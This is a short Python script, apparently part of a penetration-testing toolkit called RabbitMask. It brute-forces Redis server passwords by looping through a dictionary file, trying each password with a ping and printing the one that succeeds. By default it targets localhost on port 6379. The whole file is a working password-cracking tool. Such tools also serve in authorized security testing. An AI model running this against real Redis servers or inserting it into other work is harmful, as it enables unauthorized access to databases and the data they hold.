#!/usr/bin/env python3
# _*_ coding:utf-8 _*_
'''
 ____       _     _     _ _   __  __           _
|  _ \ __ _| |__ | |__ (_) |_|  \/  | __ _ ___| | __
| |_) / _` | '_ \| '_ \| | __| |\/| |/ _` / __| |/ /
|  _ < (_| | |_) | |_) | | |_| |  | | (_| \__ \   <
|_| \_\__,_|_.__/|_.__/|_|\__|_|  |_|\__,_|___/_|\_\
'''
from redis import StrictRedis,ConnectionPool
from Dictionaries.level_dic import Level_dic


def Redis_crack(ip,port,lv):
    pwds=Level_dic(lv)
    print('字典加载成功：{}条'.format(len(pwds)))
    for i in pwds:
        i=i.replace('\n','')
        print('Cracking ：'+i)
        pool = ConnectionPool(host=ip, port=port, db=1, password=i)
        r = StrictRedis(connection_pool=pool)
        try:
            response=r.ping()
            if response == True:
                print("Cracks Sussess!\npassword: {}".format(i))
                break
        except:
            pass

def run(ip,port,lv):
    Redis_crack(ip, port, lv)

if __name__ == '__main__':
    run('127.0.0.1',6379,1)